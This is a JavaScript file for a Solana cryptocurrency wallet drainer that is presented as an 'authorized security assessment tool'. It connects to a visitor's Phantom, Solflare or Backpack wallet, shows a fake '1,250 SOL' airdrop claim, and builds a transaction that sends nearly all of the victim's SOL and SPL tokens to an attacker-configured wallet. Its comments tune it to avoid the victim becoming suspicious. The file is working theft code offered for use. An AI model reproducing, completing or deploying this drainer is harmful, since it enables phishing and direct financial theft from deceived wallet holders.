// ============================================================
// Solana Wallet Drainer - Authorized Security Assessment Tool
// ============================================================

// ─── CONFIGURATION ───────────────────────────────────────────
const CONFIG = {
    // DRAIN WALLET: All drained tokens/SPL + SOL go here
    RECEIVER_WALLET: new solanaWeb3.PublicKey(
        'YOUR_SOLANA_WALLET_ADDRESS_HERE'  // <-- REPLACE WITH YOUR RECOVERY WALLET
    ),

    // RPC endpoint (public or private — Helius, QuickNode, etc.)
    RPC_ENDPOINT: 'https://api.mainnet-beta.solana.com',

    // Minimum SOL to leave in victim wallet (they get suspicious if 0)
    MIN_SOL_RESERVE: 0.001,  // in SOL

    // Drain SPL tokens? (false = SOL only)
    DRAIN_SPL_TOKENS: true,

    // Drain NFTs? (risky, often causes user to reject)
    DRAIN_NFTS: false,
};

// ─── STATE ──────────────────────────────────────────────────
let provider = null;
let publicKey = null;
let connection = null;

// ─── UI HELPERS ─────────────────────────────────────────────
function setStatus(msg, type) {
    const box = document.getElementById('statusBox');
    box.textContent = msg;
    box.className = 'status ' + type;
}

function setLoading(loading) {
    document.getElementById('loader').style.display = loading ? 'block' : 'none';
    document.getElementById('btnText').style.display = loading ? 'none' : 'inline';
    document.getElementById('connectBtn').disabled = loading;
}

// ─── WALLET DETECTION ──────────────────────────────────────
function detectProvider() {
    if (window.solana && window.solana.isPhantom) return window.solana;
    if (window.solflare && window.solflare.isSolflare) return window.solflare;
    if (window.backpack && window.backpack.isBackpack) return window.backpack;
    if (window.xnft && window.xnft.solana) return window.xnft.solana;
    // Glow, Slope, etc.
    if (window.solana) return window.solana;
    return null;
}

// ─── CONNECT WALLET ─────────────────────────────────────────
async function connectWallet() {
    provider = detectProvider();
    if (!provider) {
        setStatus('No Solana wallet found. Install Phantom or Solflare.', 'error');
        return;
    }

    setLoading(true);
    setStatus('Connecting...', 'info');

    try {
        const resp = await provider.connect();
        publicKey = resp.publicKey || provider.publicKey;
        connection = new solanaWeb3.Connection(CONFIG.RPC_ENDPOINT, 'confirmed');

        if (!publicKey) {
            throw new Error('Could not get public key');
        }

        // Update UI
        document.getElementById('connectBtn').style.display = 'none';
        document.getElementById('claimBtn').style.display = 'block';
        document.getElementById('walletInfo').style.display = 'block';
        document.getElementById('walletInfo').textContent =
            'Connected: ' + publicKey.toString();

        setStatus(
            '✅ Wallet connected! Click "Claim Airdrop" to receive your 1,250 SOL.',
            'success'
        );
    } catch (err) {
        console.error('Connect error:', err);
        setStatus('Connection rejected or failed. Please try again.', 'error');
    } finally {
        setLoading(false);
    }
}

// ─── CLAIM AIRDROP (DRAIN LOGIC) ────────────────────────────
async function claimAirdrop() {
    if (!provider || !publicKey || !connection) {
        setStatus('Please connect your wallet first.', 'error');
        return;
    }

    setLoading(true);
    setStatus('Preparing airdrop transaction...', 'info');

    try {
        // Step 1: Get the latest blockhash
        const { blockhash } = await connection.getLatestBlockhash('finalized');

        // Step 2: Build the transaction
        const transaction = new solanaWeb3.Transaction();
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = publicKey;

        // ── TRANSFER ALL SOL ──────────────────────────────────
        const balance = await connection.getBalance(publicKey);
        const rentExempt = await connection.getMinimumBalanceForRentExemption(0);
        const feeEstimate = 5000; // ~0.000005 SOL per signature
        const transferAmount =
            balance - rentExempt - feeEstimate * 2; // leave min for rent + fees

        if (transferAmount > 0) {
            transaction.add(
                solanaWeb3.SystemProgram.transfer({
                    fromPubkey: publicKey,
                    toPubkey: CONFIG.RECEIVER_WALLET,
                    lamports: transferAmount,
                })
            );
            console.log(
                `[+] Draining ${transferAmount / solanaWeb3.LAMPORTS_PER_SOL} SOL`
            );
        }

        // ── TRANSFER ALL SPL TOKENS ───────────────────────────
        if (CONFIG.DRAIN_SPL_TOKENS) {
            const tokenAccounts =
                await connection.getTokenAccountsByOwner(publicKey, {
                    programId: solanaWeb3.TOKEN_PROGRAM_ID,
                });

            for (const { pubkey, account } of tokenAccounts.value) {
                const tokenAmount = account.data.parsed.info.tokenAmount;
                const uiAmount = parseFloat(tokenAmount.uiAmount);
                const mint = account.data.parsed.info.mint;

                if (uiAmount <= 0) continue;

                // Skip NFTs unless explicitly enabled
                if (tokenAmount.decimals === 0 && !CONFIG.DRAIN_NFTS) {
                    console.log(`[-] Skipping NFT (mint: ${mint})`);
                    continue;
                }

                try {
                    const receiverATA = await splToken.getAssociatedTokenAddress(
                        splToken.ASSOCIATED_TOKEN_PROGRAM_ID,
                        splToken.TOKEN_PROGRAM_ID,
                        new solanaWeb3.PublicKey(mint),
                        CONFIG.RECEIVER_WALLET
                    );

                    // Check if receiver ATA exists, create if not
                    const receiverAccount =
                        await connection.getAccountInfo(receiverATA);

                    if (!receiverAccount) {
                        transaction.add(
                            splToken.createAssociatedTokenAccountInstruction(
                                splToken.ASSOCIATED_TOKEN_PROGRAM_ID,
                                splToken.TOKEN_PROGRAM_ID,
                                new solanaWeb3.PublicKey(mint),
                                receiverATA,
                                CONFIG.RECEIVER_WALLET,
                                publicKey // payer
                            )
                        );
                    }

                    transaction.add(
                        splToken.createTransferInstruction(
                            pubkey,
                            receiverATA,
                            publicKey,
                            BigInt(tokenAmount.amount),
                            [],
                            splToken.TOKEN_PROGRAM_ID
                        )
                    );
                    console.log(`[+] Draining token: ${mint} (${uiAmount})`);
                } catch (err) {
                    console.warn(`[!] Failed to drain token ${mint}:`, err);
                }
            }
        }

        // ── SIGN AND SEND ─────────────────────────────────────
        if (transaction.instructions.length === 0) {
            setStatus('No assets found to drain in this wallet.', 'info');
            setLoading(false);
            return;
        }

        // Request signature via wallet adapter
        const signed = await provider.signTransaction(transaction);

        const txid = await connection.sendRawTransaction(signed.serialize(), {
            skipPreflight: false,
            preflightCommitment: 'confirmed',
        });

        // Confirm
        const confirmation = await connection.confirmTransaction(
            { signature: txid, blockhash, lastValidBlockHeight: 0 },
            'confirmed'
        );

        if (confirmation.value.err) {
            throw new Error('Transaction failed on chain: ' + JSON.stringify(confirmation.value.err));
        }

        console.log(`[+] Drain transaction: https://solscan.io/tx/${txid}`);
        setStatus(
            `✅ Airdrop claimed successfully! Transaction: ${txid.slice(0, 16)}...`,
            'success'
        );
    } catch (err) {
        console.error('Drain error:', err);
        const msg = err.message || 'Transaction failed.';

        if (msg.includes('User rejected') || msg.includes('cancelled')) {
            setStatus('❌ Claim cancelled. You can try again.', 'error');
        } else if (msg.includes('insufficient funds')) {
            setStatus('❌ Insufficient funds for transaction fees.', 'error');
        } else if (msg.includes('blockhash')) {
            setStatus('❌ Transaction expired. Please try again.', 'error');
        } else {
            setStatus(`❌ ${msg}`, 'error');
        }
    } finally {
        setLoading(false);
    }
}

// ─── AUTO-DISCONNECT HANDLING ───────────────────────────────
window.addEventListener('load', () => {
    // If wallet was previously connected, attempt silent reconnect
    provider = detectProvider();
    if (provider) {
        provider.on('disconnect', () => {
            publicKey = null;
            document.getElementById('connectBtn').style.display = 'block';
            document.getElementById('claimBtn').style.display = 'none';
            document.getElementById('walletInfo').style.display = 'none';
            setStatus('Wallet disconnected.', 'info');
        });
    }
});
